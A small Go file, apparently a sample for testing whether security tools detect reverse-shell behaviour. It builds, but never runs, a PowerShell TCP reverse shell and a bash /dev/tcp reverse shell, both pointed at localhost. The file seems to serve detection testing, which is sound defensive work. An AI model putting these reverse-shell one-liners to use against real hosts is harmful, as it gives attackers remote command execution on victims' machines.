/*
NAME: c521b330-70eb-4c4d-b748-a8869a7bac4c.go
QUESTION: Golang detection payload
CREATED: 2023-01-05 08:33:41.322000
*/
package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

func check(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func test() {
	if runtime.GOOS == "windows" {
		mal := "$client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
		exec.Command("powershell.exe", mal)
	} else {
		mal := "bash -i >& /dev/tcp/127.0.0.1/40000 0>&1"
		exec.Command("/bin/bash", "-c", mal)
	}
}

func clean() {
	fmt.Println("Cleaned")
	os.Exit(100)
}

func main() {
	test()
}
